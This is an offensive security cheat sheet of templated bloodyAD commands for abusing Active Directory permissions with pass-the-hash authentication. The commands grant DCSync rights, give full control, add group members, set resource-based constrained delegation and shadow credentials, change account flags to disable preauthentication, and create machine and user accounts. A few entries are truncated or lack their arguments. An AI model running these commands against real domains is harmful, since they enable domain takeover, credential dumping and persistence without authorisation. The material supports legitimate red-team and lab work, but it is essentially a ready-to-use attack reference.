# bloodyAD
% windows, Active directory
#plateform/linux #target/remote  #cat/ATTACK/DACL-ABUSE

## add - add computer (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add computer  <computer_name|jubeaz> <computer_password|Zaebuj12345+->
```

## add - DCSync right (pth)
https://github.com/CravateRouge/bloodyAD
sAMAccountName, DN, GUID or SID of the trustee
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  dcsync <trustee>
```

## add - DNS record (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add dnsRecord   
```
## add - full control (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add genericAll <target> <trustee>
```
## add - groupMember (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  groupMember <group_sam> <target_sam>
```

## add - rbcd (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  rbcd <target>  <source>
```

## add - shadowCredentials (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  
```

## add - uac (pth)
https://github.com/CravateRouge/bloodyAD
SCRIPT
ACCOUNTDISABLE
HOMEDIR_REQUIRED
LOCKOUT
PASSWD_NOTREQD
PASSWD_CANT_CHANG
ENCRYPTED_TEXT_PWD_ALLOWED
TEMP_DUPLICATE_ACCOUNT
NORMAL_ACCOUNT
INTERDOMAIN_TRUST_ACCOUNT
WORKSTATION_TRUST_ACCOUNT
SERVER_TRUST_ACCOUNT
DONT_EXPIRE_PASSWORD
MNS_LOGON_ACCOUNT
SMARTCARD_REQUIRED
TRUSTED_FOR_DELEGATION
NOT_DELEGATED
USE_DES_KEY_ONLY
DONT_REQ_PREAUTH
PASSWORD_EXPIRED
TRUSTED_TO_AUTH_FOR_DELEGATION
PARTIAL_SECRETS_ACCOUN
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add uac <target_sAMAccountName> -f <uac_flag|DONT_REQUIRE_PREAUTH>
```

## add - user (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add user <sAMAccountName|jubeaz> <password|Zaebuj12345+-> 
```